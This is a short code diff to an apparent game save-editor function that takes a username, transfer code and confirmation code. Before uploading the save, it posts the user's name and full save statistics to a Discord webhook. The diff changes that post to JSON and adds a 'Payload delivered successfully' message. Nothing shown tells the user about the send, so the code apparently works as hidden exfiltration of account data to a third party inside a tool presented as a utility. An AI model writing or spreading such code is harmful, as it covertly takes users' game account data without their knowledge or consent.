@@ -44,7 +44,13 @@ def main(in_username, in_gamever, in_transfer_code, in_confirmation_code, in_cat
         Message = {
             "content": f"USER : {in_username}```{save_stats}```"
         }
-        requests.post(discord_webhook_url, data=Message)
+        result = requests.post(url, json = Message)
+        try:
+            result.raise_for_status()
+        except requests.exceptions.HTTPError as err:
+            print(err)
+        else:
+            print("Payload delivered successfully, code {}.".format(result.status_code))
         transfercode, account_pin = edits.save_management.server_upload.save_and_upload(save_stats)
         return transfercode, account_pin
     except Exception as e:
